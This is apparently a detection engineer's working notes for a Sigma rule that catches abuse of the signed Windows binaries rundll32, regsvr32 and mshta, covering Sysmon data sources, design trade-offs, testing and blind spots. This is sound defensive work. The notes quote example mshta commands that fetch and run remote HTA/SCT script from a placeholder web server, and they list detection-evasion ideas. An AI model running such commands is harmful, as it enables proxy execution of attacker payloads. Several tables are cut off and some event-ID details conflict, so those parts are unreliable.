# Research notes — T1218.005/010/011- suspicious binary execution.

*Working notes compiled during rule development. Not polished — this is the actual research trail.*

---

## Hypothesis
This rule will target three official Microsoft binaries that are commonly executed across windows estates, Rundll32, Regsvr32, Mshta. Attackers abuse all three as since they're signed Microsoft binaries this means (a) All trusted by allowlists, (b) network-and-proxy aware, and (c) capable of running script or DLL payloads.


## ATT&CK page & research notes



**MSHTA**
"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. 
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.

Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))

They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta"


**regvsr32**
Used by adversaries to proxy execution of malicious code, it's an exe that can be used to register/ unregister obkect linkining and embedding controls incuding DLLs.
Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. 

**Rundll32**
Abused to proxy malicious code execution. Signed by MS so looks legitimate, adversaries can execute JavaScript/ HTML & control panel items .cpl.

## Data source research

It's clear the best fit for this is using PID captures via sysmon EID 1, filtering down to a single log source which can then be correlated with sysmon EID 3 to detect when the Proccess is making outward connections, a sign of high suspicion.
**Sysmon EIDs**

| Event ID | Meaning |
| --- | --- |
| 1 | Process creation   |
| 3 | Network connection |
| 7 | ImageLoad |
| 10| FileCreate|

### How each event should be used
- Sysmon EID 1: Process creation will be used to spot the initial process launch, the large amount of data captured will be useful for deciding if there is any malicious behavior occuring. 
- Sysmon EID 3: Network connections, all 3 techniques im targetting use official microsoft binaries that have no buisness making outgoing connections, this is 100% suspicious activity.

**Useful for post detection analysis**
- Sysmon EID 7 (ImageLoad): catches loading unusual/ user writable DDL path.
- Sysmon EID 11 (FileCreation): Supporting signal to see if a payload drops a file first, this would be auto monitored and reported on anyway and reported to an incident since I'm designing this rule for sentinel.

## Existing community rules reviewed

ser accounts, excluding system activity and machine accounts.

**Decision**: write my own Sigma rule. 


## Detection ideology & architecture

Target T1218.011/010/005 with one sigma yml rule, this will look at the most suspicious occurances for each TTP.
Then I'll create an additional sigma rule for correlation that will use sysmon EID 7 as it's log source to detect network connections following the defence evasion detected.

Following this I will correlate the two- Joining on GUID/ DeviceID and create a well reasoned risk system based on these two tables combined.
I will still allow an event with no network connection to raise a medium/ high alert but when a network connection also occurs it will automatically be raised as a high severity alert.

**Pros**
- Focusing on TTP rather then IOCs while targetting 3 sub techniques, somewhat high risk but if executed correctly it can squash a very common large attack surface well. The reward meets the risk & effort cost well.
- Severity scoring system works well to grade the alert info/med/high based on multiple factors occuring throughout the event process, reducing FP rate while accounting for edge cases.
- Correlating with network traffic is a low effort/risk high reward move.


**Cons**
- Getting false positives right since this is an official exe signed by Microsoft it'll be difficult to keep low FP.
- Complexity of implementation and ongoing maintanance- Since this detection targets 3 different sub Techniques at once testing and tuning all will be cumbersome, in addition to this building two sigma rules (One big KQL) will add more complexity and room for maintance to be required since theres multiple fields/ log sources in the mix the chances of one needing a change is relatively high.

- Coverage of all three threats simuntaneously may be weaker then if I made an atomic rule for each- will require tuning inside your environment to ensure low FP rate while catching the threats.


## Chainsaw unit batch testing

Created a batch of malicious and benign Windows event logs (Real Sysmon EID1/3 logs collected via `Telemetry_Collector.ps1`), ran the rule against them using Chainsaw via the pytest harness, and tuned to reduce the FP rate on the benign and the missed-TP rate on the malicious logs.

### What each set exercises

| # | Malicious | Hits |
| --- | --- | --- |
| 1 | `mal_schtask_encoded_powershell` | LOLBin + encoded args, via |

| # | Benign | Purpose |
| --- | --- | --- |
| 1 | `benign_signed_backup_task` | Baseline clean case |

### Results

Full detail and raw harness output in [Validation.md](Validation.md); the short version:

| Iteration | Benign FP rate | Malicious TP rate | What changed |
| --- | --- | --- | --- |
| 1 | 20% | 80% | Starting point — missed the `\Users\Public\` WMI 

**Description of result**


## Atomic Red Team unit batch testing

Using the following tests to check the yml alert still works after conversion to Splunk's SPL, then a batch of ART tests to hunt missed ground / edge cases.

| Test | Creation method | Payload as-shipped | Exercises which criteria |
| --- | --- | --- | --- |
| #1 | schtasks.exe | `cmd.exe /c calc.exe` | LOLBin only (cmd.exe) — weak signal, no suspicious args |
| #1 | 
**Outcome**

### Likely FP sources

- Rundll32 — biggest FP source by far; huge legitimate baseline (Control Panel routing, printer mgmt, installers). Filter on DLL path outside System32/SysWOW64/Program  Files, not just presence of rundll32.
- Regsvr32 — routine software install/uninstall (older ActiveX apps, Java, legacy Office). Watch for SCCM/Intune deployment bursts across many hosts at once.
- Mshta — lower baseline, but legacy internal admin tools and older LOB installers still use HTA.

### Blind spots & assumptions

- Assumes Sysmon is running and untampered — an attacker who kills/unloads it defeats the rule set entirely. Needs a companion check on Sysmon service state.
- Command-line string matches (e.g. /i:http) are brittle against case/encoding obfuscation.
- Detection keys on Image name/path — binary renaming bypasses it unless OriginalFileName is also checked.
- "No network = lower severity" assumes live, single-stage execution — staged payloads may show zero network activity and land only in the medium bucket.
- No coverage for remote-triggered execution (WMI/PsExec/WinRM) — only covers local/interactive chains.
